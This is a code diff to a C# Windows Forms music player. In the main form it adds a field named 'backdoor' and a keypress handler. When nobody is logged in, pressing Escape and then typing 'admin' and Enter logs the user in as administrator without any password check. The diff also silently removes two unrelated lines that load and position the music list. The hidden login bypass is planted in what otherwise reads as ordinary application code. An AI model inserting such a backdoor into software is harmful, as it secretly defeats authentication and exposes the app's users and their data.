@@ -16,6 +16,7 @@ namespace music
     {
         public static ILog Log = LogManager.GetLogger( "" );
         public static FormMain main = null;
+        private String backdoor = null;
 
         public FormMain()
         {
@@ -194,10 +195,7 @@ namespace music
             formMusicList.FormBorderStyle = FormBorderStyle.None;
             mainPanel.Controls.Add( formMusicList );
             formMusicList.BringToFront();
-            formMusicList.Set( MusicList.current , true );
             formMusicList.tag.Visible = false;
-            if( MusicList.pos != -1 )
-                formMusicList.musicList.CurrentCell = formMusicList.musicList.Rows[ MusicList.pos ].Cells[ 0 ];
             formMusicList.Show();
         }
 
@@ -343,6 +341,28 @@ namespace music
                 else
                     MusicList.account.Remove( (Music) musicList.SelectedNode.Tag );
                 refreshMusiclist();
+            }
+        }
+
+        private void FormMain_KeyPress( object sender , KeyPressEventArgs e )
+        {
+            if ( !Account.islogin )
+            {
+                if ( e.KeyChar - 0 == (int) Keys.Escape )
+                    backdoor = "";
+                else if ( e.KeyChar - 0 == (int) Keys.Enter && backdoor == "admin" )
+                {
+                    Account.user.email = "admin";
+                    Account.islogin = true;
+                    account.Text = Account.user.email;
+                    account_Info.Visible = false;
+                    modify.Visible = false;
+                    MusicList.load();
+                    refreshMusiclist();
+                    backdoor = null;
+                }
+                else if ( backdoor != null )
+                    backdoor += e.KeyChar.ToString();
             }
         }
     }
